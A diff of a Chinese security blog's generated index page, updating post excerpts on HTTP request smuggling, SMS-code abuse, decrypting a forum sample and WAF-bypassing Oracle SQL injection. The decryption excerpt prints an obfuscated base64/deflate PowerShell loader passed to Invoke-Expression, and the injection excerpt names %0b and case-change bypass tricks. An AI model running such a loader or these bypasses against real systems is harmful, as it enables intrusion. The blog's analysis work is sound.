@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://doggy-test.github.io">
   <title>Doggy的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -15,6 +15,7 @@
 <meta property="og:url" content="https://doggy-test.github.io/index.html">
 <meta property="og:site_name" content="Doggy的博客">
 <meta property="og:description" content="南京邮电大学2014级">
+<meta property="og:locale" content="default">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Doggy的博客">
 <meta name="twitter:description" content="南京邮电大学2014级">
@@ -36,7 +37,7 @@
   
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -146,6 +147,86 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-http请求走私漏洞翻译" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/30/http请求走私漏洞翻译/">http请求走私漏洞翻译</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/30/http请求走私漏洞翻译/" class="archive-article-date">
+  	<time datetime="2019-09-30T01:12:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p><a href="https://portswigger.net/web-security/request-smuggling/finding" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding</a></p>
+</blockquote>
+<p>这一节教导大家使用不同的方法来发现smuggling漏洞</p>
+<h5 id="使用计时技术来发现漏洞"><a href="#使用计时技术来发现漏洞" class="headerlink" title="使用计时技术来发现漏洞"></a>使用计时技术来发现漏洞</h5><p>最常用的检测方法是发送请求，如果存在漏洞，那么会造成时延。Burp Scanner使用这种方法来检测smuggling漏洞</p>
+<h5 id="使用计时技术发现CL-TE漏洞（Content-Length-Transfer-Encoding）"><a href="#使用计时技术发现CL-TE漏洞（Content-Length-Transfer-Encoding）" class="headerlink" title="使用计时技术发现CL.TE漏洞（Content-Length.Transfer-Encoding）"></a>使用计时技术发现CL.TE漏洞（Content-Length.Transfer-Encoding）</h5><p>如果应用存在请求smuggling漏洞，那么可以使用Cl.TE变种进行攻击，发送下述请求通常会导致时间延迟<br>
+        
+          <a class="article-more-a" href="/2019/09/30/http请求走私漏洞翻译/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">翻译文章</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/文章搬运/" class="article-tag-list-link color5">文章搬运</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/30/http请求走私漏洞翻译/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
   
     <article id="post-短信验证码问题（三）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -259,7 +340,7 @@
 <blockquote>
 <p>之前写在笔记上的一次记录，转一下</p>
 </blockquote>
-<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png" alt=""></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png" alt></p>
 <p>直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求</p>
         
           <a class="article-more-a" href="/2019/07/26/遍历手机号发送验证码-二/#more">more >></a>
@@ -336,9 +417,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>在土司看到这样一篇帖子，要求解密 <a href="https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415</a></p>
+<p>在土司看到这样一篇帖子，要求解密 <a href="https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415</a></p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Invoke-Expression</span> $(<span class="built_in">New-Object</span> IO.StreamReader ($(<span class="built_in">New-Object</span> IO.Compression.DeflateStream ($(<span class="built_in">New-Object</span> IO.MemoryStream (,$([Convert]::FromBase64String(<span class="string">'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'</span>)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</div></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> $(<span class="built_in">New-Object</span> IO.StreamReader ($(<span class="built_in">New-Object</span> IO.Compression.DeflateStream ($(<span class="built_in">New-Object</span> IO.MemoryStream (,$([Convert]::FromBase64String(<span class="string">'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'</span>)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</span><br></pre></td></tr></table></figure>
 <p>注意到了 <em>$(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(</em></p>
         
           <a class="article-more-a" href="/2019/07/23/一次解密/#more">more >></a>
@@ -501,7 +582,7 @@
         <h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h4><blockquote>
 <p>狗不是好狗，比较容易绕过，但也是第一次手工注入oracle，所以记录一下</p>
 </blockquote>
-<h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02.过程"></a>0x02.过程</h4><p>网站的url长这样:<a href="http://www.xxx.cn/xxx.php?zjid=1000" target="_blank" rel="external">http://www.xxx.cn/xxx.php?zjid=1000</a><br>经过简单的测试，过滤了空格以及union select</p>
+<h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02.过程"></a>0x02.过程</h4><p>网站的url长这样:<a href="http://www.xxx.cn/xxx.php?zjid=1000" target="_blank" rel="noopener">http://www.xxx.cn/xxx.php?zjid=1000</a><br>经过简单的测试，过滤了空格以及union select</p>
 <p>通过fuzz，%0b没有过滤，union select可以通过简单的大小写转换绕过，怕是出现在ctf里的送分题。这样就简单了，简单改下sqlmap的tamper，成功跑出了数据库相关信息<br>
         
           <a class="article-more-a" href="/2017/08/09/一次过狗oracle手工注入/#more">more >></a>
@@ -540,86 +621,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/08/09/一次过狗oracle手工注入/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-7-12笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/12/7-12笔记/">7.12笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2017/07/12/7-12笔记/" class="archive-article-date">
-  	<time datetime="2017-07-12T08:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong><em>1.dns解析</em></strong></p>
-<blockquote>
-<p><a href="https://ricterz.me/posts/CUIT%20CTF%20Pentest%20Writeup" target="_blank" rel="external">https://ricterz.me/posts/CUIT%20CTF%20Pentest%20Writeup</a></p>
-</blockquote>
-<p>python的dnspython模块可以用来进行dns的查询。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding=UTF-8</span></div><div class="line"><span class="keyword">import</span> dns.resolver</div><div class="line">domain = <span class="string">"njupt.edu.cn"</span></div><div class="line">query_list = [<span class="string">"A"</span>,<span class="string">"MX"</span>,<span class="string">"NS"</span>,<span class="string">"CNAME"</span>]</div><div class="line"><span class="string">"""</span></div><div class="line">A记录：将主机名转换成IP地址 </div><div class="line">MX记录：邮件交换记录，定义邮件服务器的域名 </div><div class="line">CNAME记录：别名记录，实现域名间的映射 。</div><div class="line">NS记录：标记区域的域名服务器及授权子域 ，用来指定该域名由哪个DNS服务器来进行解析</div><div class="line">"""</div><div class="line"><span class="keyword">for</span> _query <span class="keyword">in</span> query_list:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> _query + <span class="string">":"</span></div><div class="line">        result = dns.resolver.query(domain,_query)</div><div class="line">        <span class="keyword">for</span> each_answer <span class="keyword">in</span> result.response.answer:</div><div class="line">            <span class="keyword">print</span> each_answer</div><div class="line">    <span class="keyword">except</span> Exception,e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"No result"</span></div></pre></td></tr></table></figure></p>
-<p>结果为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">A:</div><div class="line">njupt.edu.cn. <span class="number">6607</span> IN A <span class="number">202.119</span><span class="number">.230</span><span class="number">.8</span></div><div class="line">njupt.edu.cn. <span class="number">6607</span> IN A <span class="number">202.119</span><span class="number">.230</span><span class="number">.10</span></div><div class="line">MX:</div><div class="line">njupt.edu.cn. <span class="number">6722</span> IN MX <span class="number">1</span> em1.njupt.edu.cn.</div><div class="line">NS:</div><div class="line">njupt.edu.cn. <span class="number">6764</span> IN NS ns.njupt.edu.cn.</div><div class="line">njupt.edu.cn. <span class="number">6764</span> IN NS dns.njupt.edu.cn.</div><div class="line">CNAME:</div><div class="line">No result</div></pre></td></tr></table></figure></p>
-        
-          <a class="article-more-a" href="/2017/07/12/7-12笔记/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/笔记/" class="article-tag-list-link color3">笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/12/7-12笔记/">展开全文 >></a>
         </p>
       
 
@@ -722,15 +723,19 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">心情随笔，生活感悟</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+                <a href="javascript:void(0)" class="js-tag color5">翻译文章</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -742,11 +747,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">加密解密</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color5">加密解密</a>
               </li>
              
               <li class="article-tag-list-item">
